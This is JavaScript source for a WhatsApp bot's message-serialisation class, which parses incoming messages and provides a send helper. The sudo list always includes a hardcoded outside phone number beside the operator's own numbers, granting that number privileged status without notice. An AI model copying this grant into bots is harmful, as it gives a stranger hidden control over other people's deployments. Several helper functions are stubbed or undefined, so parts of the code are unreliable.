const {
  generateWAMessageContent,
  extractMessageContent,
  jidNormalizedUser,
  getContentType,
  normalizeMessageContent,
  proto,
  delay,
  downloadContentFromMessage,
  getBinaryNodeChild,
  WAMediaUpload,
  generateForwardMessageContent,
  downloadMediaMessage,
  generateWAMessageFromContent,
  getBinaryNodeChildren,
  areJidsSameUser,
  generateWAMessage,
  jidDecode,
  WA_DEFAULT_EPHEMERAL
} = require("@whiskeysockets/baileys");
const fs = require("fs");
const FileType = require("file-type");
const path = require("path");
const PhoneNumber = require('awesome-phonenumber')
const getBuffer = ()=>{};
const toAudio = () => {},toPTT = ()=>{};

const config = require('../config');

const {
  fromBuffer
} = require("file-type")
/*
const {
  imageToWebp,
  videoToWebp,
  writeExifImg,
  writeExifVid,
  writeExifWebp
} = require('../sticker');
*/

const Jimp = require("jimp");
const util = require("util");
const M = proto.WebMessageInfo;

class serialize {
  constructor(m, conn, createrS="", store) {
    if (!m) return m;
    m = M.fromObject(m);
    for (let i in m) this[i] = m[i];
    this.sudo = createrS;
        Object.defineProperty(this, "store", { value: store });
    Object.defineProperty(this, "client", { value: conn });
    Object.defineProperty(this, "m", { value: m });
    this.sudo = [jidNormalizedUser(this.client.user.id), "917593919575@s.whatsapp.net", ...config.SUDO.split(',')].map(a=>a.trim());
    this.type = getContentType(this.message);
    if(this[this.type] == 'reactionMessage') {
       this.reaction = {
           reaction: true,
           text: this.message[this.type].text
       }
    this.message[this.type].text = null;
    }
    this.body = this.text = this.message?.conversation ||  this.message?.[this.type]?.text || this.message?.[this.type]?.caption || this.message?.[this.type]?.contentText || this.message?.[this.type]?.selectedDisplayText || this.message?.[this.type]?.title || "";
    this.data = {
      key: this.key,
      message: this.message
    };
    this._key(conn);
    this._message(conn);
    this._client(conn, createrS);
    this.makeId = (length = 8) => {
      const characters = "1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ";
      let result = "INRLMD";
      for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters.charAt(randomIndex);
      }
      return result;
      };
  }
  _key(conn) {
    if (this.key) {
      this.from = this.jid = this.chat = jidNormalizedUser(this.key.remoteJid || this.key.participant);
      this.fromMe = this.key.fromMe;
      this.id = this.key.id;
      this.isBot = this.id == undefined || null ? 'false' : this.id.startsWith("BAE5") && this.id.length == 16;
      this.isGroup = this.from.endsWith("@g.us");
      this.mediaType = this.type ? this.type.replace(/extended|message/gi, '').toLowerCase().replace("conversation","text").trim() : "protocol";
      this.sender = jidNormalizedUser(
        (this.fromMe && conn.user?.id) || this.key.participant || this.from || "");
    }
  }
  _message(conn) {
    if (this.message) {
      this.message = extractMessageContent(this.message);
      this.msg = this.message[this.type];
      const reply_message = this.msg?.contextInfo ? this.msg?.contextInfo?.quotedMessage : null;
      if (reply_message) {
      this.reply_message = {};
        this.reply_message.i = true;
        this.reply_message.message = reply_message;
        this.reply_message.type = getContentType(reply_message);
        this.reply_message[this.reply_message.type.replace('Message','')] = this.reply_message.type;
        this.reply_message.msg = reply_message[this.reply_message.type];
        this.reply_message.id = this.msg?.contextInfo?.stanzaId;
        this.reply_message.sender = jidNormalizedUser(this.msg?.contextInfo?.participant);
        this.reply_message.from = this.from;
        this.reply_message.mention = new Object();
        this.reply_message.mention.jid = reply_message?.msg?.extendedTextMessage?.contextInfo?.mentionedJid || this.reply_message?.msg?.contextInfo?.mentionedJid || [];
        this.reply_message.mention.isBotNumber = this.reply_message.mention.jid.includes(conn.botNumber);
        this.reply_message.isBot = this.reply_message.id ? this.reply_message?.id?.startsWith("BAE5") && this.reply_message?.id == 16 : 'false';
        this.reply_message.fromMe = this.reply_message?.sender == jidNormalizedUser(conn.user && conn.user?.id);
        this.reply_message.text = reply_message?.extendedTextMessage?.text || reply_message?.text || this.reply_message?.msg?.caption || reply_message?.conversation || "";
        this.reply_message.caption = this.reply_message.msg?.caption;
        this.reply_message.isAnimatedSticker = this.reply_message.msg?.isAnimated;
        this.reply_message.seconds = this.reply_message.msg?.seconds;
        this.reply_message.duration = this.reply_message.msg?.seconds;
        this.reply_message.width = this.reply_message.msg?.width;
        this.reply_message.height = this.reply_message.msg?.height;
        this.reply_message.isEval = this.reply_message.text ? ["require", "await", "return"].map(a => this.reply_message.text.includes(a)).includes(true) : false
        this.reply_message.mime = this.reply_message.msg?.mimetype;
        this.reply_message.number = this.reply_message.sender ? this.reply_message.sender.replace(/[^0-9]/g, '') : undefined;
        this.reply_message.data = M.fromObject({
          key: {
            remoteJid: this.reply_message?.from,
            fromMe: this.reply_message?.fromMe,
            id: this.reply_message.id,
            participant: jidNormalizedUser(this.msg?.contextInfo?.participant)
          },
          message: this.reply_message.message,
          ...(this.reply_message?.isGroup ? {
            participant: this.reply_message?.sender
          } : {}),
        });
        this.reply_message.delete = () => conn.sendMessage(this.reply_message?.from, {
          delete: this.reply_message.data.key
        });
        this.reply_message.download = (pathFile) => conn.downloadMediaMessage(this.reply_message?.msg, pathFile);
      } else {
        this.reply_message = new Object();
        this.reply_message.i = false;
        this.reply_message.mention = new Object();
      }
    }
  }
  _client(conn, createrS) {
    this.number = this.sender.replace(/[^0-9]/g, '');
    this.botNumber = jidNormalizedUser(conn.user.id);
    this.displayId = this.body = this.displayText = this.message?.conversation || this.message?.[this.type]?.text || this.message?.[this.type]?.caption || this.message?.[this.type]?.contentText || this.message?.[this.type]?.selectedDisplayText || this.message?.[this.type]?.title || this.text || "";
    this.budy = typeof this.text == "string" ? this.text : "";
    this.pushName = this.pushName || "No Name";
    this.botNumber = jidNormalizedUser(conn.user.id);
    this.caption = this.message?.[this.type]?.caption;
    this.secounds = this.message?.secounds;
    this.mention = new Object();
    this.mention.jid = this.msg?.contextInfo?.mentionedJid || [];
    this.mention.isBotNumber = this.mention.jid.includes(this.botNumber);
    this.itsMe = this.sender == this.botNumber ? true : false;
    this.quoted = this.reply_message?.from ? this.reply_message : this;
    this.mime = (this.quoted.msg || this.quoted).mimetype || "text";
    this.isMedia = /image|video|sticker|audio/.test(this.mime);
    this.from = this.key.remoteJid;
    if(this.type) this[this.type.replace('Message','')] = this.message[this.type];
    this.isEval = ["require", "await", "return"].map(a => this.body.includes(a)).includes(true);
    this.number = this.sender.replace(/[^0-9]/g, "");
    this.user = {};
    this.user.jid = jidNormalizedUser(conn.user.id);
    this.user.number = this.user.jid.replace(/[^0-9]/g, "");
  };
  async send(message, options = {}, type = "text", recipient = this.from) {
    if (["photo", "img", "picture", "pic", "image"].includes(type)) {
      type = "image";
    } else if (["vid", "mp4", "video"].includes(type)) {
      type = "video";
    } else if (["aud", "mp3", "wawe", "audio"].includes(type)) {
      type = "audio";
    }

    const isBuffer = Buffer.isBuffer(message);
    const isTextOrBuffer = type === "text" || isBuffer;
    const isUrl = !isTextOrBuffer && typeof message !== "object" && message.startsWith("http");

    if (type !== "text" && isUrl) {
      message = await getBuffer(await extractUrlFromMessage(message));
    }

    if ((type !== "text" && !isUrl && !isBuffer) || (type === "text" && options.readAs)) {
      if (fs.existsSync('./' + message)) {
        if (type === "text") {
          options.readAs = "utf-8";
        }
        message = await fs.promises.readFile(message, options.readAs);
        if (options.readAs) {
          delete options.readAs;
        }
      }
    }

    if (options.jpegThumbnail) {
      options.jpegThumbnail = await genThumb(options.jpegThumbnail);
    }

    if (options.addUrlInfo) {
      Object.assign(options, await getUrlInfo(await extractUrlFromMessage(message)));
      delete options.addUrlInfo;
    }

    if (config.LINKPREVIEW) {
      if (!options.contextInfo && !options.linkPreview) {
        options.linkPreview = JSON.parse(config.CONTEXTINFO);
      }
    }

    if (type === "gif") {
      type = "video";
      options.gifPlayback = true;
      message = await gifToBuff(message);
    }

    if (options.waveform) {
      options.waveform = new Uint8Array(options.waveform);
      options.mimetype = "audio/ogg; codecs=opus";
      if (options.ptt) {
        delete options.ptt;
      }
    }

    if (options.mentions) {
      if (!options.contextInfo) {
        options.contextInfo = {};
      }
      options.contextInfo.mentionedJid = options.mentions;
    }

    if (options.linkPreview) {
      options.contextInfo = {
        externalAdReply: options.linkPreview,
      };
      delete options.linkPreview;
    }

    if (type === "ptv") {
      type = "video";
      options.ptv = true;
    }

    if (type === "text") {
      if (options?.contextInfo?.externalAdReply) {
        options.contextInfo.externalAdReply.previewType = "PHOTO";
        options.contextInfo.externalAdReply.containsAutoReply = true;
      }

      let sentMessage = await this.client.sendMessage(recipient, {
        text: util.format(message),
        ...options,
        ephemeralExpiration: WA_DEFAULT_EPHEMERAL,
      }, {
        quoted: options.quoted,
        messageId: options.id || this.makeId(),
      });

      sentMessage.edit = async (newText) => {
        return await this.client.relayMessage(recipient, {
          protocolMessage: {
            key: sentMessage.key,
            type: 0xe,
            editedMessage: {
              conversation: newText,
            },
          },
        }, {
          cachedGroupMetadata: this.store.fetchGroupMetadata,
        });
      };

      sentMessage.delete = async () => {
        return await this.client.sendMessage(recipient, {
          delete: sentMessage.key,
        }, {
          cachedGroupMetadata: this.store.fetchGroupMetadata,
        });
      };

      sentMessage.react = async (emoji) => {
        return await this.client.sendMessage(recipient, {
          react: {
            text: emoji,
            key: sentMessage.key,
          },
        }, {
          cachedGroupMetadata: this.store.fetchGroupMetadata,
        });
      };

      return sentMessage;
    } else if (type === "edit") {
      return await this.client.sendMessage(recipient, {
        text: message.text,
        edit: message.key,
      }, {
        quoted: options.quoted,
      });
    } else if (type === "delete") {
      return await this.client.sendMessage(recipient, {
        delete: message.key,
        participant: options.participant,
      });
    } else if (type === "sticker") {
      if (!options.packname) {
        options.packname = config.STICKER_PACKNAME.split(';')[0];
      }
      if (!options.author) {
        options.author = config.STICKER_PACKNAME.split(';')[1];
      }
      return await this.client.sendSticker(recipient, message, {
        packname: options.packname,
        author: options.author,
        ...options,
        messageId: options.id || this.makeId(),
        ephemeralExpiration: WA_DEFAULT_EPHEMERAL,
      });
    } else if (type === "button") {
      let buttonMessage;
      let mediaContent;
      let mediaType;

      if (options.type === "image" || options.type === "video") {
        const preparedMedia = await prepareWAMessageMedia({ [options.type]: message }, {
          upload: this.client.waUploadToServer,
        });
        mediaContent = preparedMedia[options.type + "Message"];
        mediaType = options.type + "Message";
        buttonMessage = options.value;
      } else {
        mediaContent = await fs.readFileSync("./lib/temp/media/black.jpg");
        buttonMessage = message;
        mediaType = "jpegThumbnail";
      }

      const interactiveMessageContent = {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 0x2,
          },
          interactiveMessage: proto.Message.InteractiveMessage.create({
            body: proto.Message.InteractiveMessage.Body.create({ text: options.body }),
            footer: proto.Message.InteractiveMessage.Footer.create({ text: options.footer }),
            header: proto.Message.InteractiveMessage.Header.create({
              title: options.title,
              subtitle: "Loki-Xer;Jarvis-md",
              hasMediaAttachment: true,
              [mediaType]: mediaContent,
            }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
              buttons: await generateButtonText(buttonMessage),
            }),
          }),
        },
      };

      let interactiveMessage = generateWAMessageFromContent(recipient, {
        viewOnceMessage: interactiveMessageContent,
      }, {
        quoted: options.quoted,
        userJid: this.user.id,
      });

      await this.client.relayMessage(recipient, interactiveMessage.message, {
        quoted: options.quoted,
        messageId: this.makeId(),
      });

      return interactiveMessage;
    } else if (type === "poll") {
      const { values, onlyOnce = true, keyId, withPrefix = false, selectableCount = 1, participates } = options;
      let pollOptions = values.map(({ displayText, id }) => ({
        name: displayText,
        id,
        onlyOnce,
        keyId,
        withPrefix,
        participates,
      }));

      const pollDisplayTexts = values.map(({ displayText }) => displayText);

      const pollMessage = await this.client.sendMessage(recipient, {
        poll: {
          name: message,
          values: pollDisplayTexts,
          selectableCount,
        },
      });

      this.store.votes.poll[pollMessage.key.id] = pollOptions;
      return pollMessage;
    } else {
      return await this.client.sendMessage(recipient, {
        [type]: message,
        ...options,
        ephemeralExpiration: WA_DEFAULT_EPHEMERAL,
      }, {
        quoted: options.quoted,
        messageId: options.id || this.makeId(),
      });
    }
  }
}
module.exports = serialize;